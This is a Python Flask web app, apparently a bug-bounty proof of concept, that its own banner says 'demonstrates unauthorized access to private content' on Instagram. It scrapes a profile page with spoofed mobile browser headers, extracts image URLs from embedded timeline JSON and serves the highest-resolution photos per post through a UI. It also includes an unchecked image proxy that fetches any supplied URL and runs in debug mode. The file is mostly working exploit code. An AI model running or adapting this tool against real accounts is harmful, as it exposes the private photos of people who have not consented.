from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import io
import re

app = Flask(__name__)
CORS(app)

def fetch_instagram_profile(username):
    """Fetches Instagram profile page - EXACT match to your CLI"""
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en;q=0.9',
        'dpr': '1',
        'priority': 'u=0, i',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.56", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.56"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"6.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '1000',
    }
    url = f'https://www.instagram.com/{username}/'
    response = requests.get(url, headers=headers)
    return response if response.status_code == 200 else None

def decode_url(escaped_url):
    """Decodes escaped Instagram CDN URLs - EXACT match"""
    try:
        decoded = escaped_url.encode('utf-8').decode('unicode_escape')
    except:
        decoded = escaped_url
    decoded = unquote(decoded)
    return decoded

def extract_all_image_urls_recursive(obj, urls=None, post_id=None):
    """EXACT same recursive extraction from your CLI POC"""
    if urls is None:
        urls = set()

    if isinstance(obj, dict):
        if 'pk' in obj and isinstance(obj.get('pk'), str):
            post_id = obj['pk']

        if 'image_versions2' in obj:
            candidates = obj['image_versions2'].get('candidates', [])
            for candidate in candidates:
                url = candidate.get('url', '')
                height = candidate.get('height', 0)
                width = candidate.get('width', 0)
                resolution = f"{width}x{height}"

                if url:
                    decoded_url = decode_url(url)
                    urls.add((post_id or 'unknown', resolution, decoded_url))

        for value in obj.values():
            extract_all_image_urls_recursive(value, urls, post_id)

    elif isinstance(obj, list):
        for item in obj:
            extract_all_image_urls_recursive(item, urls, post_id)

    return urls

def extract_timeline_data(html_content):
    """Extract timeline data - EXACT match to your CLI"""
    soup = BeautifulSoup(html_content, 'html.parser')
    script_tags = soup.find_all('script', {'type': 'application/json'})

    for script in script_tags:
        script_content = script.string
        if not script_content:
            continue
        if 'polaris_timeline_connection' in script_content and 'image_versions2' in script_content:
            try:
                data = json.loads(script_content)
                return data
            except json.JSONDecodeError:
                continue
    return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/extract', methods=['POST'])
def extract():
    """Main extraction endpoint"""
    data = request.get_json()
    username = data.get('username', '').strip()
    
    if not username:
        return jsonify({'error': 'Username required'}), 400
    
    try:
        response = fetch_instagram_profile(username)
        if not response:
            return jsonify({'error': f'Could not fetch profile for @{username}'}), 404
        
        timeline_data = extract_timeline_data(response.text)
        
        if not timeline_data:
            return jsonify({'error': 'No timeline data found'}), 404
        
        image_urls = extract_all_image_urls_recursive(timeline_data)
        
        if not image_urls:
            return jsonify({'error': 'No images found'}), 404
        
        # Convert to list for JSON response
        images_list = []
        for post_id, resolution, url in image_urls:
            images_list.append({
                'post_id': post_id,
                'resolution': resolution,
                'url': url
            })
        
        # Group by post and find highest resolution for each
        posts = {}
        for img in images_list:
            if img['post_id'] not in posts:
                posts[img['post_id']] = {
                    'all_resolutions': [],
                    'highest_resolution': None,
                    'highest_url': None
                }
            posts[img['post_id']]['all_resolutions'].append(img)
        
        # Find highest resolution for each post (largest width*height)
        for post_id in posts:
            resolutions = posts[post_id]['all_resolutions']
            # Parse resolution strings like "1080x1080" to get area
            def get_area(res_str):
                try:
                    if 'x' in res_str:
                        w, h = res_str.split('x')
                        return int(w) * int(h)
                    return 0
                except:
                    return 0
            
            highest = max(resolutions, key=lambda x: get_area(x['resolution']))
            posts[post_id]['highest_resolution'] = highest['resolution']
            posts[post_id]['highest_url'] = highest['url']
        
        return jsonify({
            'success': True,
            'username': username,
            'total_posts': len(posts),
            'total_images': len(images_list),
            'posts': posts
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/get_resolutions', methods=['POST'])
def get_resolutions():
    """Get all resolutions for a specific post"""
    data = request.get_json()
    post_id = data.get('post_id', '')
    username = data.get('username', '')
    
    if not post_id or not username:
        return jsonify({'error': 'Post ID and username required'}), 400
    
    try:
        # Refetch the profile data
        response = fetch_instagram_profile(username)
        if not response:
            return jsonify({'error': 'Could not fetch profile'}), 404
        
        timeline_data = extract_timeline_data(response.text)
        if not timeline_data:
            return jsonify({'error': 'No timeline data'}), 404
        
        image_urls = extract_all_image_urls_recursive(timeline_data)
        
        # Filter images for this post
        post_images = []
        for pid, resolution, url in image_urls:
            if pid == post_id:
                post_images.append({
                    'resolution': resolution,
                    'url': url
                })
        
        # Sort by resolution (largest first)
        def get_area(res_str):
            try:
                if 'x' in res_str:
                    w, h = res_str.split('x')
                    return int(w) * int(h)
                return 0
            except:
                return 0
        
        post_images.sort(key=lambda x: get_area(x['resolution']), reverse=True)
        
        return jsonify({
            'success': True,
            'post_id': post_id,
            'total_resolutions': len(post_images),
            'images': post_images
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/proxy_image', methods=['GET'])
def proxy_image():
    """Proxy endpoint to fetch images"""
    url = request.args.get('url')
    if not url:
        return jsonify({'error': 'No URL provided'}), 400
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 Chrome/141.0.0.0 Mobile Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return send_file(
                io.BytesIO(response.content),
                mimetype='image/jpeg',
                as_attachment=False
            )
    except Exception as e:
        print(f"Proxy error: {e}")
    
    return jsonify({'error': 'Failed to fetch image'}), 404

if __name__ == '__main__':
    print("=" * 70)
    print("Instagram Private Account Access - Graphical POC")
    print("FOR SECURITY RESEARCH / BUG BOUNTY DEMONSTRATION ONLY")
    print("=" * 70)
    print("\n[!] WARNING: Only test on accounts you own or have permission to test")
    print("[!] This demonstrates unauthorized access to private content")
    print("\n[*] Starting server at http://localhost:5000")
    print("[*] Press Ctrl+C to stop\n")
    app.run(debug=True, host='localhost', port=5000)